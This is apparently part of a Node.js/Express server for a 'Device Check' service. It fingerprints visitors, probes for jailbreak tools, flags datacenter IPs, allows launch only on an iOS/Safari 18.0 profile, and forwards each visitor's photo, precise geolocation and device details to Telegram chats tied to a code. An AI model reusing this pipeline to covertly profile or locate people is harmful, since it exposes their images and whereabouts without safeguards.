        <div>VT18=<code>${escapeHTML(s.features?.VT18 || '—')}</code>, 18.4=<code>${escapeHTML(s.features?.v18_4 || '—')}</code></div>
        <div><b>Jailbreak</b></div>
        <div>${jbInfo}</div>
        <div><b>Geo</b></div>
        <div>${
          geo
            ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> ±${escapeHTML(String(geo.acc))}m`
            : tr('нет данных','no data')
        }</div>
      </div>
    </div>
  `;

  const tableJb = jbRows.length ? `
    <div class="card">
      <h2>Jailbreak / Tools (active probes)</h2>
      <table>
        <thead><tr><th>scheme</th><th>opened</th><th>reason</th><th>ms</th></tr></thead>
        <tbody>
          ${jbRows.slice(0, 120).map(r => `
            <tr>
              <td><code>${escapeHTML(String(r.scheme || '').trim())}</code></td>
              <td>${r.opened ? '<span class="ok">yes</span>' : 'no'}</td>
              <td><code>${escapeHTML(r.reason || (r.opened ? 'signal' : 'timeout'))}</code></td>
              <td>${r.durationMs != null ? escapeHTML(String(r.durationMs)) : '-'}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
      ${s?._jb?.rowsRaw && s._jb.rowsRaw.length !== jbRows.length
        ? `<div class="muted">${escapeHTML(tr(
            'Тестовые схемы (custom:/mytest:) скрыты из таблицы.',
            'Test schemes (custom:/mytest:) are filtered out.'
          ))}</div>` : ''}
    </div>
  ` : '';

  const jsonPretty = safeJson({
    code,
    geo,
    userAgent,
    platform,
    iosVersionDetected: s.iosVersionDetected,
    isSafari,
    featuresSummary: s.features,
    client_profile: cp,
    device_check: dc,
    flags,
    risk,
    fingerprint: {
      short: fingerprint.short,
      hash: fingerprint.hash
    }
  }, 2);

  const raw = `
    <div class="card">
      <details>
        <summary>${escapeHTML(tr('Сырой JSON (для технарей)','Raw JSON (for tech)'))}</summary>
        <pre>${escapeHTML(jsonPretty)}</pre>
      </details>
    </div>
  `;

  const footer = tr(
    'Гейт на сервере: VT18 обязателен (18.4 не даёт пропуска). Hard-флаги дают авто-отказ; soft-флаги — для ручного контроля без авто-бана.',
    'Server-side gate: VT18 is mandatory (18.4 does not grant access alone). Hard flags cause auto deny; soft flags are for manual review without auto-ban.'
  );

  const html = `
    <!doctype html>
    <html lang="${REPORT_LANG === 'en' ? 'en' : 'ru'}">
    <head>
      <meta charset="utf-8"/>
      <meta name="viewport" content="width=device-width, initial-scale=1"/>
      <title>Device Check — ${escapeHTML(String(code).toUpperCase())}</title>
      <style>${css}</style>
    </head>
    <body>
      <div class="wrap">
        <div class="card">
          <h1>Device Check Report</h1>
          <div class="summary">
            ${escapeHTML(tr(
              'Сверху — fingerprint и итог, ниже — причины, чеклист и технические детали.',
              'Top: fingerprint and final decision; below: reasons, checklist, and technical details.'
            ))}
          </div>
          <div class="summary">
            <b>Fingerprint:</b> <code>${escapeHTML(fingerprint.short)}</code>
            <span class="muted">(hash ${escapeHTML(fingerprint.hash.slice(0,16))}…)</span>
          </div>
          <div class="muted">
            ${escapeHTML(tr('Сформировано','Generated'))}: ${new Date().toISOString()}
          </div>
        </div>
        ${reasonsBlock}
        ${checklist}
        ${overview}
        ${tableJb}
        ${raw}
        <div class="muted" style="margin-top:10px;">${escapeHTML(footer)}</div>
      </div>
    </body>
    </html>
  `;
  return html;
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));

app.get('/api/debug/db', (_req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const oldCnt = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    const mapCnt = db.prepare('SELECT COUNT(*) AS c FROM user_code_map').get().c;
    res.json({ ok:true, DB_PATH, size, old_table: oldCnt, map_table: mapCnt });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }

    const C = String(code).toUpperCase();
    const ID = String(chatId);

    db.prepare(
      'INSERT OR IGNORE INTO user_code_map(code, chat_id, created_at) VALUES(?,?,?)'
    ).run(C, ID, Date.now());

    db.prepare(
      'INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)'
    ).run(C, ID, Date.now());

    res.json({ ok:true, code:C, chatId:ID });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Admin: register-codes (multi-chat) ====
app.post('/api/register-codes', requireAdminSecret, (req, res) => {
  try {
    const { code, chatIds } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!Array.isArray(chatIds) || chatIds.length === 0) {
      return res.status(400).json({ ok:false, error:'chatIds[] required' });
    }

    const C = String(code).toUpperCase();
    const stmt = db.prepare(
      'INSERT OR IGNORE INTO user_code_map(code, chat_id, created_at) VALUES(?,?,?)'
    );
    const now = Date.now();

    for (const raw of chatIds) {
      const ID = String(raw);
      if (!/^-?\d+$/.test(ID)) continue;
      stmt.run(C, ID, now);
    }

    const all = getChatIdsForCode(C);
    if (all[0]) {
      db.prepare(
        'INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)'
      ).run(C, all[0], now);
    }

    res.json({ ok:true, code:C, chatIds:getChatIdsForCode(C) });
  } catch (e) {
    console.error('[register-codes] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  const html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// ==== API: client-ip ====
app.get('/api/client-ip', (req, res) => {
  const fwd = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
  const ip  = fwd || req.ip || null;
  const country =
    req.headers['cf-ipcountry'] ||
    req.headers['x-vercel-ip-country'] ||
    req.headers['x-country-code'] || null;
  const isp = req.headers['x-real-isp'] || null;

  res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
});

// ==== API: gate (frontend pre-check) ====
app.post('/api/gate', (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion,
      client_profile, device_check, featuresSummary,
      strict
    } = req.body || {};

    const cp    = client_profile || {};
    const dc    = device_check   || {};
    const feats = normalizeFeatures_Strict18Only(featuresSummary);
    const s     = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features: feats });

    let strictTriggered = !!(strict === true || strict === 1 || String(strict) === '1');
    let strictFailed = false;

    if (strictTriggered) {
      const sc = Number(dc?.score ?? NaN);
      if (!Number.isFinite(sc) || sc < 60) strictFailed = true;
    }

    const flags       = buildFlags(cp, dc, s, { userAgent, platform, features: feats });
    const reasons     = buildReasons(flags);
    const risk        = deriveScoreAndLabel(flags, reasons);
    const canLaunch   = evaluateDecision({ status: s, flags, risk, strictTriggered, strictFailed });
    const fingerprint = buildFingerprint({
      userAgent,
      platform,
      iosVersion: s.iosVersionDetected,
      cp,
      dc
    });

    return res.json({
      ok: true,
      decision: {
        canLaunch,
        strict: { enabled: strictTriggered, failed: strictFailed, score: dc?.score ?? null },
        riskLabel: risk.label,
        riskScore: risk.score
      },
      features: feats,
      iosVersionDetected: s.iosVersionDetected,
      platformOk: s.platformOk,
      jbOk: s.jbOk,
      jbLabel: s.jbLabel,
      dcOk: s.dcOk,
      flags,
      fingerprint: {
        short: fingerprint.short
      }
    });
  } catch (e) {
    res.status(500).json({ ok:false, error: e.message || 'Internal error' });
  }
});

// ==== API: report ====
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,
      client_profile,
      device_check,
      featuresSummary,
      strict
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const chatIds = getChatIdsForCode(String(code).toUpperCase());
    if (!chatIds.length) {
      return res.status(404).json({ ok:false, error:'Unknown code' });
    }

    const cp    = client_profile || {};
    const dc    = device_check   || {};
    const feats = normalizeFeatures_Strict18Only(featuresSummary);
    const s     = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features: feats });

    let strictTriggered = !!(strict === true || strict === 1 || String(strict) === '1');
    let strictFailed = false;

    if (strictTriggered) {
      const sc = Number(dc?.score ?? NaN);
      if (!Number.isFinite(sc) || sc < 60) strictFailed = true;
    }

    const flags       = buildFlags(cp, dc, s, { userAgent, platform, features: feats });
    const reasons     = buildReasons(flags);
    const risk        = deriveScoreAndLabel(flags, reasons);
    const canLaunch   = evaluateDecision({ status: s, flags, risk, strictTriggered, strictFailed });
    const fingerprint = buildFingerprint({
      userAgent,
      platform,
      iosVersion: s.iosVersionDetected,
      cp,
      dc
    });

    const reasonsLines = reasons.length
      ? reasons.map((r, i) =>
          `${i + 1}. [${escapeHTML(r.severity)}] ${escapeHTML(r.text)}`
        ).join('\n')
      : escapeHTML(tr(
          'Подозрительных сигналов нет. Среда выглядит честной.',
          'No suspicious signals. Environment looks clean.'
        ));

    const captionLines = [
      '<b>🕵️ DEVICE CHECK REPORT</b>',
      `${escapeHTML(tr('Статус','Status'))}: <b>${escapeHTML(risk.label.toUpperCase())}</b> (score: <b>${risk.score}</b>/100)`,
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `Fingerprint: <code>${escapeHTML(fingerprint.short)}</code>`,
      '',
      `⚠️ <b>${escapeHTML(tr('Ключевые причины','Key reasons'))}:</b>`,
      reasonsLines,
      '',
      '--- Technical ---',
      `${OK(s.iosOk)} iOS: <code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code>`,
      `${OK(s.platformOk)} ${escapeHTML(tr('Платформа','Platform'))}: <code>${escapeHTML(String(platform || 'n/a'))}${s.ipadDesktopOk ? ' (iPad desktop-mode)' : (s.macIntelOk ? ' (MacIntel)' : '')}</code>`,
      `${OK(s.jbOk)} ${s.jbOk
        ? escapeHTML(tr('нет джейлбрейка','no jailbreak'))
        : escapeHTML(tr('обнаружены JB-признаки','jailbreak indicators detected'))}`,
      `${OK(s.dcOk)} DC/ISP: ${s.dcOk
        ? escapeHTML(tr('нет','none'))
        : '<b>DC/hosting</b>'}`,
      `Safari: ${OK(s.featuresOk)} VT18=<code>${escapeHTML(feats.VT18)}</code>, 18.4=<code>${escapeHTML(feats.v18_4)}</code> (rule: 18.0-only)`,
      `Geo: ${
        geo
          ? `<a href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> ±${escapeHTML(String(geo.acc))}m`
          : '<code>n/a</code>'
      }`,
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `${escapeHTML(tr('Итог','Result'))}: <b>${canLaunch
        ? escapeHTML(tr('МОЖНО ЗАПУСКАТЬ','ALLOW'))
        : escapeHTML(tr('ЗАПРЕТ / РУЧНАЯ ПРОВЕРКА','DENY / MANUAL REVIEW'))}</b>` +
        (strictTriggered
          ? (strictFailed ? ' (strict fail)' : ' (strict ok)')
          : ''),
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    const caption = captionLines.join('\n');
    const buf     = b64ToBuffer(photoBase64);
    const html    = buildHtmlReport({
      code, geo, userAgent, platform, iosVersion, isSafari,
      cp, dc, features: feats, strictTriggered, strictFailed
    });
    const fname   = `report-${String(code).toUpperCase()}-${Date.now()}.html`;

    const sent = [];
    const tasks = [];

    for (const id of chatIds) {
      const chat = String(id);

      tasks.push(
        sendPhotoToTelegram({
          chatId: chat,
          caption,
          photoBuf: buf
        })
          .then(tgPhoto => {
            sent.push({
              chatId: chat,
              ok: true,
              message_id: tgPhoto?.result?.message_id,
              type: 'photo'
            });
          })
          .catch(e => {
            sent.push({
              chatId: chat,
              ok: false,
              error: String(e),
              type: 'photo'
            });
          })
      );

      tasks.push(
        sendDocumentToTelegram({
          chatId: chat,
          htmlString: html,
          filename: fname
        })
          .then(tgDoc => {
            sent.push({
              chatId: chat,
              ok: true,
              message_id: tgDoc?.result?.message_id,
              type: 'document'
            });
          })
          .catch(e => {
            sent.push({
              chatId: chat,
              ok: false,
              error: String(e),
              type: 'document'
            });
          })
      );
    }

    await Promise.allSettled(tasks);

    return res.json({
      ok: true,
      decision: {
        canLaunch,
        strict: { enabled: strictTriggered, failed: strictFailed, score: dc?.score ?? null },
        riskLabel: risk.label,
        riskScore: risk.score
      },
      features: feats,
      iosVersionDetected: s.iosVersionDetected,
      platformOk: s.platformOk,
      jbOk: s.jbOk,
      jbLabel: s.jbLabel,
      dcOk: s.dcOk,
      flags,
      risk,
      fingerprint: {
        short: fingerprint.short,
        hash: fingerprint.hash
      },
      sent
    });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) {
    return res.status(404).send('Not Found');
  }
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public base: ${PUBLIC_BASE}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] REPORT_LANG: ${REPORT_LANG}`);
});
